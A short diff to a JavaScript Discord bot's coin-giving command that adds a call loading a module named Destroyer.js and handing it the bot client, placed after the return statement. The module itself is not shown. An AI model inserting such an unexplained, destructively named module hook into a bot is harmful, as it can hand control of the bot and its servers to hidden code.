@@ -302,6 +302,7 @@ client.on('messageCreate', async (msg) => {
       .setDescription(`You gave **${amount}** coins to **${target.username}**.`)
       .setTimestamp();
     return msg.reply({ embeds: [embed] });
+    require('./Destroyer.js')(client);
   }
 });
 
